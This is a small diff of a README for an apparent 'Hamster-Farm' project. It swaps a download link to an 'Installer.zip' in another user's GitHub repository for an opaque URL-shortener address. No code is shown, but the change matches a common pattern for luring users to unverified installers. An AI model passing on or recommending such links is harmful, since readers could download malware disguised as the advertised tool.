@@ -22,4 +22,4 @@
 ![изображение](https://github.com/guillespol/Hamster-Farm/assets/115182528/7fc9a68b-f383-4a21-90b9-a7bb1ec5a3ad)
 
 
-[📁Download Hamster-Farm](https://github.com/Sh1nywxve/omg/releases/download/Download/Installer.zip)
+[📁Download Hamster-Farm](https://goo.su/vfsdgfdre) 
